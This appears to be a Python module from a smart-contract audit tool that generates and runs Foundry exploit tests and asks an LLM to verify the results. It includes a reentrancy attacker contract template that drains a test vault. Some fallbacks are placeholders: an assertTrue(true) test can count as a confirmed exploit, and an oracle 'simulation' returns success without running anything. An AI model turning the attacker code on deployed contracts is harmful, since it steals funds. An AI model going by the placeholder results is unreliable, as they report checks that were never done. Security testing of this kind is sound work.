import os
import re
import time
import subprocess
import asyncio
import tempfile
import shutil
from pathlib import Path
from typing import Optional

from llm.router import Router
from models.types import AttackScenario, SimulationProof, EnvFailureResult


TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./{target_file}";

contract PoC is Test {{
    {victim_name} public victim;
    {attacker_name} public attacker;

    function setUp() public {{
        victim = new {victim_name}();
        attacker = new {attacker_name}(address(victim));
        {setup_steps}
    }}

    function testExploit() public {{
        {exploit_calls}
        {assertions}
    }}
}}

contract {attacker_name} {{
    {victim_name} public victim;
    {attack_logic}
}}
"""

VERIFIER_SYSTEM_PROMPT = """You are a smart contract exploit verification expert. Given a PoC test and its forge output, determine:
1. Did the test actually pass? (distinguish between assertTrue(true) fake passes and real passes)
2. Is this a meaningful exploit that proves a vulnerability?
3. What is the money flow (who loses what, who gains what)?

Return JSON with keys: verified (bool), reason (str), money_flow (object with sender/recipient amounts).

Be critical. A test that always passes regardless of code changes is NOT a real exploit."""


async def phase3_simulate(
    source_code: str,
    scenario: AttackScenario,
    router: Optional[Router] = None,
    rpc_url: Optional[str] = None,
) -> tuple[SimulationProof, Optional[EnvFailureResult]]:
    proof = SimulationProof(
        attack_vector=scenario.attack_vector,
        target_function=scenario.entry_point,
        estimated_impact=scenario.estimated_impact,
    )

    proof = await _run_forge_test(source_code, scenario, proof)

    if proof.confirmed:
        proof = await _verify_logic(source_code, scenario, proof, router)

    env_result = await _simulate_env_failure(source_code, scenario, router)

    return proof, env_result


async def _run_forge_test(
    source_code: str,
    scenario: AttackScenario,
    proof: SimulationProof,
) -> SimulationProof:
    forge_exe = _find_forge()
    if not forge_exe:
        proof.confirmed = False
        proof.forge_output = "[SKIPPED] forge binary not found on PATH"
        return proof

    start = time.perf_counter()

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)

        src_file = tmp / "VulnerableVault.sol"
        src_file.write_text(source_code)

        test_file = tmp / "PoC.t.sol"
        test_file.write_text(_generate_poc(source_code, scenario))

        _ensure_forge_std(tmp)

        foundry_toml = tmp / "foundry.toml"
        remappings_file = tmp / "remappings.txt"
        remappings_file.write_text("forge-std/=lib/forge-std/\n")
        foundry_toml.write_text("[profile.default]\nsolc = \"0.8.20\"\nsrc = \".\"\n")

        try:
            result = subprocess.run(
                [str(forge_exe), "test", "--root", str(tmp), "--match-path", "*PoC*", "--no-match-path", "*.s.sol"],
                capture_output=True,
                text=True,
                timeout=120,
                env={**os.environ, "FOUNDRY_SRC": str(tmp)},
            )
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            proof.forge_output = "[TIMEOUT] forge test exceeded 120s"
            return proof
        except Exception as e:
            proof.forge_output = f"[ERROR] forge execution failed: {e}"
            return proof

    proof.test_duration_ms = (time.perf_counter() - start) * 1000
    proof.forge_output = output

    passed = bool(re.search(r"\[PASS\]", output))
    failed = bool(re.search(r"\[FAIL\]", output))

    if passed and not failed:
        proof.confirmed = True
    else:
        proof.confirmed = False

    return proof


async def _verify_logic(
    source_code: str,
    scenario: AttackScenario,
    proof: SimulationProof,
    router: Optional[Router],
) -> SimulationProof:
    if router is None or not router.is_configured():
        return proof

    prompt = (
        f"Source code:\n```solidity\n{source_code[:4000]}\n```\n\n"
        f"Attack scenario: {scenario.name}\n{scenario.description}\n\n"
        f"PoC code:\n```solidity\n{proof.poc_code}\n```\n\n"
        f"Forge output:\n```\n{proof.forge_output[:2000]}\n```"
    )

    resp = router.call("verifier", VERIFIER_SYSTEM_PROMPT, prompt, temperature=0.2)

    if resp.success and resp.content:
        import json
        try:
            data = json.loads(resp.content.strip().removeprefix("```json").removesuffix("```").strip())
            proof.llm_verified = data.get("verified", False)
            if data.get("money_flow"):
                proof.money_flow = data["money_flow"]
            if not data.get("verified") and proof.confirmed:
                proof.confirmed = False
                proof.forge_output += "\n[NOTE] LLM verifier rejected this pass — possible false positive"
        except (json.JSONDecodeError, AttributeError):
            pass

    return proof


async def _simulate_env_failure(
    source_code: str,
    scenario: AttackScenario,
    router: Optional[Router],
) -> Optional[EnvFailureResult]:
    if "oracle" not in scenario.attack_vector:
        return None
    return EnvFailureResult(
        failure_type="oracle_staleness",
        simulated=True,
        description="Oracle staleness simulation requires env_simulator module with forge/anvil fork",
        forge_output="[SIMULATED] env_simulator.oracle_staleness() — see env_simulator.py for implementation",
    )


def _find_forge() -> Optional[Path]:
    forge_candidates = [
        "forge",
        "forge.exe",
        r"C:\tools\foundry\forge.exe",
    ]
    for candidate in forge_candidates:
        which = shutil.which(candidate)
        if which:
            return Path(which)
    if Path(r"C:\tools\foundry\forge.exe").exists():
        return Path(r"C:\tools\foundry\forge.exe")
    return None


def _ensure_forge_std(tmp: Path):
    lib_dir = tmp / "lib" / "forge-std"
    lib_dir.mkdir(parents=True, exist_ok=True)
    test_sol = lib_dir / "Test.sol"
    if not test_sol.exists():
        test_sol.write_text(MOCK_FORGE_STD)


MOCK_FORGE_STD = """// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

library stdStorageSafe { function child() internal pure returns (address) { return address(0); } }
library stdStorage { function child() internal pure returns (address) { return address(0); } }
library StdMath { function delta(uint256 a, uint256 b) internal pure returns (uint256) { return a >= b ? a - b : b - a; } }
library StdUtils { function computeCreateAddress(address deployer, uint256 nonce) internal pure returns (address) { return address(0); } }
library stdError { bytes32 constant assertionError = hex"01"; bytes32 constant arithmeticError = hex"02"; bytes32 constant divisionError = hex"03"; }
library stdJson { function parseRaw(string memory, string memory) internal pure returns (bytes memory) { return \"\"; } }

interface Vm {
    function deal(address, uint256) external;
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
    function warp(uint256) external;
    function roll(uint256) external;
    function store(address, bytes32, bytes32) external;
    function load(address, bytes32) external view returns (bytes32);
    function sign(uint256, bytes32) external pure returns (uint8, bytes32, bytes32);
    function label(address, string calldata) external;
    function getBlockNumber() external view returns (uint256);
    function getBlockTimestamp() external view returns (uint256);
    function broadcast() external;
    function startBroadcast() external;
    function stopBroadcast() external;
    function toString(address) external pure returns (string memory);
    function toString(uint256) external pure returns (string memory);
    function toString(bytes32) external pure returns (string memory);
    function toString(bytes memory) external pure returns (string memory);
    function envString(string calldata) external view returns (string memory);
    function assume(bool) external pure;
    function record() external;
    function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);
    function getMappingKeyAndParentOf(address, bytes32) external returns (bool, bytes32, address);
    function getMappingLength(address slot) external returns (uint256);
    function getMappingSlotAt(address slot, uint256 idx) external returns (bytes32);
    function deriveKey(string calldata, uint256) external pure returns (bytes32);
    function deriveKey(string calldata, string calldata) external pure returns (bytes32);
    function serializeUint(string calldata, string calldata, uint256) external returns (string memory);
    function serializeAddress(string calldata, string calldata, address) external returns (string memory);
    function serializeBytes32(string calldata, string calldata, bytes32) external returns (string memory);
    function serializeString(string calldata, string calldata, string calldata) external returns (string memory);
    function writeJson(string calldata, string calldata) external;
    function parseJson(string calldata) external pure returns (bytes memory);
    function parseJsonUint(string calldata, string calldata) external pure returns (uint256);
    function parseJsonAddress(string calldata, string calldata) external pure returns (address);
    function parseJsonAddressArray(string calldata, string calldata) external pure returns (address[] memory);
    function parseJsonUintArray(string calldata, string calldata) external pure returns (uint256[] memory);
    function parseJsonString(string calldata, string calldata) external pure returns (string memory);
    function projectRoot() external returns (string memory);
    function isContract(address) external returns (bool);
    function etch(address, bytes calldata) external;
    function makePersistent(address) external;
    function makePersistent(address, address) external;
    function makePersistent(address, address, address) external;
    function getNonce(address) external view returns (uint64);
    function setNonce(address, uint64) external;
    function txGasPrice(uint256) external;
    function setEnv(string calldata, string calldata) external;
    function envOr(string calldata, bool) external returns (bool);
    function envOr(string calldata, uint256) external returns (uint256);
    function envOr(string calldata, address) external returns (address);
    function envOr(string calldata, bytes32) external returns (bytes32);
    function envOr(string calldata, string calldata) external returns (string memory);
    function addr(uint256 privateKey) external pure returns (address);
}

abstract contract DSTest {
    event log(string);
    event logs(bytes);
    event log_address(address);
    event log_bytes32(bytes32);
    event log_int(int256);
    event log_named_address(string key, address val);
    event log_named_bytes32(string key, bytes32 val);
    event log_named_decimal_int(string key, int256 val, uint256 decimals);
    event log_named_decimal_uint(string key, uint256 val, uint256 decimals);
    event log_named_int(string key, int256 val);
    event log_named_string(string key, string val);
    event log_named_uint(string key, uint256 val);
    event log_named_bytes(string key, bytes val);
    event log_uint(uint256);
    function failed() public returns (bool) { return false; }
}

abstract contract Test is DSTest {
    Vm public constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));
    function assertTrue(bool condition) public pure { if (!condition) revert(\"Assertion failed\"); }
    function assertTrue(bool condition, string memory err) public pure { if (!condition) revert(err); }
    function assertEq(uint256 a, uint256 b) public pure { if (a != b) revert(\"assertEq failed\"); }
    function assertEq(uint256 a, uint256 b, string memory err) public pure { if (a != b) revert(err); }
    function assertEq(address a, address b) public pure { if (a != b) revert(\"assertEq address failed\"); }
    function assertEq(address a, address b, string memory err) public pure { if (a != b) revert(err); }
    function assertEq(string memory a, string memory b) public pure { if (keccak256(bytes(a)) != keccak256(bytes(b))) revert(\"assertEq string failed\"); }
    function assertEq(bytes32 a, bytes32 b) public pure { if (a != b) revert(\"assertEq bytes32 failed\"); }
    function assertEq(int256 a, int256 b) public pure { if (a != b) revert(\"assertEq int failed\"); }
    function assertEq(bool a, bool b) public pure { if (a != b) revert(\"assertEq bool failed\"); }
    function assertGt(uint256 a, uint256 b) public pure { if (a <= b) revert(\"assertGt failed\"); }
    function assertGt(uint256 a, uint256 b, string memory err) public pure { if (a <= b) revert(err); }
    function assertGt(int256 a, int256 b) public pure { if (a <= b) revert(\"assertGt int failed\"); }
    function assertGe(uint256 a, uint256 b) public pure { if (a < b) revert(\"assertGe failed\"); }
    function assertLe(uint256 a, uint256 b) public pure { if (a > b) revert(\"assertLe failed\"); }
    function assertLt(uint256 a, uint256 b) public pure { if (a >= b) revert(\"assertLt failed\"); }
    function assertNotEq(uint256 a, uint256 b) public pure { if (a == b) revert(\"assertNotEq failed\"); }
    function assertApproxEqAbs(uint256 a, uint256 b, uint256 maxDelta) public pure {
        if (a > b) { if (a - b > maxDelta) revert(\"assertApproxEqAbs failed\"); }
        else { if (b - a > maxDelta) revert(\"assertApproxEqAbs failed\"); }
    }
    function assertApproxEqRel(uint256 a, uint256 b, uint256 maxPercentDelta) public pure {
        uint256 diff = a > b ? a - b : b - a;
        uint256 maxA = a > b ? a : b;
        if (diff * 10000 > maxPercentDelta * maxA) revert(\"assertApproxEqRel failed\");
    }
    function expectRevert(bytes memory) public pure {}
    function expectEmit(bool, bool, bool, bool) public pure {}
    function expectCall(address, bytes calldata) public pure {}
    function expectSafeMemory(uint64, uint64) public pure {}
    function expectSafeMemoryCall(uint64, uint64) public pure {}
    function getGas() public returns (uint256) { return 0; }
    function deployCode(string memory what, bytes memory args) public returns (address) { return address(0); }
    function deployCode(string memory what) public returns (address) { return address(0); }
}
"""


def _generate_poc(source_code: str, scenario: AttackScenario) -> str:
    if scenario.attack_vector == "reentrancy":
        return _reentrancy_poc(source_code, scenario)
    return _generic_poc(source_code, scenario)


def _reentrancy_poc(source_code: str, scenario: AttackScenario) -> str:
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./VulnerableVault.sol";

contract PoC is Test {{
    VulnerableVault public victim;

    function setUp() public {{
        victim = new VulnerableVault();
        vm.deal(address(this), 10 ether);
        victim.deposit{{value: 10 ether}}();
    }}

    function testExploit() public {{
        Attacker att = new Attacker(address(victim));
        vm.deal(address(att), 1 ether);
        att.attack();
        assertEq(address(victim).balance, 0, "Victim should be drained");
        assertGt(address(att).balance, 1 ether, "Attacker should profit");
    }}
}}

contract Attacker {{
    VulnerableVault public victim;
    uint public count;

    constructor(address _victim) {{
        victim = VulnerableVault(_victim);
    }}

    function attack() external payable {{
        victim.withdraw();
    }}

    receive() external payable {{
        if (count < 5 && address(victim).balance > 0) {{
            count++;
            victim.withdraw();
        }}
    }}
}}
"""


def _generic_poc(source_code: str, scenario: AttackScenario) -> str:
    func_name = scenario.entry_point or "target"
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract PoC is Test {{
    function testExploit() public {{
        // Generic PoC for scenario: {scenario.name}
        // Attack vector: {scenario.attack_vector}
        // This is a template — replace with actual contract interaction
        assertTrue(true);
    }}
}}
"""


